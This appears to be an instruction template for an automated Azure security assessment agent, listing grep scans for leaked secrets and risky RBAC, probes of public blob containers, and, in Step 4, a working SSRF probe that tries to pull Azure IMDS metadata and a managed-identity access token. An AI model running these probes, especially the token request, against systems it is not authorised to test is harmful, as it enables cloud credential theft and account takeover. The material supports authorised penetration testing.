<scope>
Focus exclusively on Azure-specific attack surfaces:
- RBAC assignments: Owner, Contributor, User Access Administrator at subscription/resource group scope
- Azure Blob Storage: public containers (Blob or Container access), SAS token leaks
- Azure Instance Metadata Service (IMDS): SSRF to `169.254.169.254/metadata/instance`
- Service Principals: leaked client secrets, certificate leaks, over-permissive app registrations
- Azure Functions / App Services: Function App key exposure, unauthenticated endpoints
- AKS: cluster-admin binding, kubelet API exposure, node managed identity over-permissions
- Key Vault: overly permissive access policies, soft-delete disabled
- Azure AD / Entra ID: guest user enumeration, overly permissive OAuth app consents
- Azure Storage connection strings: account keys in source code or environment variables
</scope>

<systematic_approach>
Work through the following steps. Skip steps where tools are unavailable — document the skip with a reason.

**Step 1 — Catalogue Prior Cloud Findings**
Read cloud_security_deliverable.md and extract all Azure-specific signals:
- Storage account names and container names
- Service Principal app IDs and tenant IDs
- Function App URLs and hostnames (*.azurewebsites.net, *.azurefd.net)
- Key Vault names, AKS cluster names
- IaC file paths (*.tf with azurerm provider, ARM templates *.json, bicep files)

**Step 2 — RBAC and Service Principal Analysis**
Search IaC and config files for dangerous RBAC assignments:

```bash
# Find RBAC role assignment definitions in Terraform
grep -rn 'azurerm_role_assignment\|azurerm_role_definition' \
  {{REPO_PATH}} --include="*.tf" 2>/dev/null | grep -v ".git" | head -30

# Detect dangerous built-in roles
grep -rn '"Owner"\|"Contributor"\|"User Access Administrator"\|"/subscriptions/.*roleDefinitions"' \
  {{REPO_PATH}} 2>/dev/null | grep -v ".git" | head -20

# Service Principal client secret leaks
grep -rn 'client_secret\|AZURE_CLIENT_SECRET\|ARM_CLIENT_SECRET\|tenant_id.*client_id.*client_secret' \
  {{REPO_PATH}} --include="*.env*" --include="*.tf" --include="*.yaml" --include="*.json" 2>/dev/null \
  | grep -v ".git" | head -20
```

**Step 3 — Azure Blob Storage Exposure**
For each storage account found in Step 1, test public container accessibility:

```bash
# Test for public blob containers (replace STORAGE_ACCOUNT and CONTAINER with discovered names)
curl -s -o /dev/null -w "HTTP %{http_code}" \
  "https://STORAGE_ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list" 2>/dev/null

# Check for publicly accessible blobs
curl -s --max-time 5 \
  "https://STORAGE_ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list&maxresults=5" \
  2>/dev/null | head -30

# Look for hardcoded storage account keys (Base64, 88 chars, ending in ==)
grep -rn 'AccountKey=[A-Za-z0-9+/]\{86\}==\|DefaultEndpointsProtocol=https;AccountName=' \
  {{REPO_PATH}} --include="*.env*" --include="*.json" --include="*.yaml" --include="*.cs" 2>/dev/null \
  | grep -v ".git" | head -10
```

**Step 4 — SSRF to Azure IMDS**
Test whether the target application reflects the Azure Instance Metadata Service:

```bash
# Azure IMDS requires Metadata: true header
# Test via common SSRF parameter names
for param in url redirect callback src proxy target fetch webhook; do
  resp=$(curl -s --max-time 3 -H "Metadata: true" \
    "{{WEB_URL}}?${param}=http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
  if echo "$resp" | grep -q '"compute"\|"network"\|"azEnvironment"\|"subscriptionId"'; then
    echo "SSRF FOUND via param: $param"
    echo "$resp" | head -20
    break
  fi
done

# Also test managed identity token endpoint
curl -s --max-time 5 \
  "{{WEB_URL}}?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/" \
  2>/dev/null | head -20
```

**Step 5 — Azure Functions / App Services**
Check for exposed Function App keys and unauthenticated endpoints:

```bash
# Find Function App host and function keys in source code
grep -rn 'x-functions-key\|FUNCTIONS_KEY\|AzureWebJobsStorage\|functionapp.*key' \
  {{REPO_PATH}} --include="*.env*" --include="*.json" --include="*.yaml" --include="*.ts" --include="*.cs" 2>/dev/null \
  | grep -v ".git" | head -20

# Find Function App URLs in IaC
grep -rn 'azurerm_function_app\|azurerm_linux_function_app\|azurerm_windows_function_app' \
  {{REPO_PATH}} --include="*.tf" 2>/dev/null | grep -v ".git" | head -20
```

**Step 6 — Key Vault Access Policy Review**
Examine Key Vault access policies and soft-delete configuration:

```bash
# Find Key Vault access policy definitions
grep -rn 'azurerm_key_vault\|access_policy\|soft_delete_enabled\|purge_protection_enabled' \
  {{REPO_PATH}} --include="*.tf" 2>/dev/null | grep -v ".git" | head -30

# Look for Key Vault secret references
grep -rn 'keyvault.azure.net\|KEY_VAULT_URI\|AZURE_KEYVAULT' \
  {{REPO_PATH}} 2>/dev/null | grep -v ".git" | head -20
```

**Step 7 — AKS Security Assessment**
Check AKS cluster configuration in IaC:

```bash
# Find AKS cluster definitions
grep -rn 'azurerm_kubernetes_cluster' \
  {{REPO_PATH}} --include="*.tf" 2>/dev/null | grep -v ".git" | head -20

# Look for dangerous AKS settings
grep -rn 'role_based_access_control_enabled\|local_account_disabled\|private_cluster_enabled\|azure_active_directory_role_based_access_control' \
  {{REPO_PATH}} --include="*.tf" 2>/dev/null | grep -v ".git" | head -20
```
